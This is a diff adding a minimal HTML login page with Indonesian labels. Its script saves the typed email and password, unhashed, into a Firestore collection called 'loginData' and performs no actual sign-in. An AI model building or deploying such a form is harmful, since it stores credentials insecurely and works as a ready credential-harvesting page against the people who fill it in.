@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Form Login</title>
+</head>
+<body>
+
+<h2>Login</h2>
+
+<input type="text" id="email" placeholder="Email"><br><br>
+<input type="password" id="password" placeholder="Password"><br><br>
+
+<button onclick="kirim()">Kirim</button>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+const firebaseConfig = {
+ apiKey: "AIzaSyBDtcKN-_fTJZj68Vcuxu1uh9ua8A9eqwo",
+ authDomain: "data-simpan-7477e.firebaseapp.com",
+ projectId: "data-simpan-7477e",
+ storageBucket: "data-simpan-7477e.firebasestorage.app",
+ messagingSenderId: "568703498749",
+ appId: "1:568703498749:web:8cd38a11c46acbc0e10194"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+window.kirim = async function(){
+
+let email = document.getElementById("email").value;
+let password = document.getElementById("password").value;
+
+await addDoc(collection(db,"loginData"),{
+email: email,
+password: password
+});
+
+alert("Data tersimpan");
+
+}
+
+</script>
+
+</body>
+</html>
